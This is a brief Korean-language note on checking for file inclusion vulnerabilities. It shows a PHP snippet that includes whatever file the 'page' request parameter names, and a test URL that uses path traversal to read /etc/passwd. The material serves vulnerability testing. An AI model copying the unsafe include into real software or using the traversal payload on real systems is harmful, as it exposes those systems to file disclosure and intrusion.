# 파일 포함

파일 포함 취약점 점검 내용입니다.

## PHP 포함

```php
<?php include($_GET['page']); ?>
```

## 테스트

```bash
http://target/page=../../../etc/passwd
```
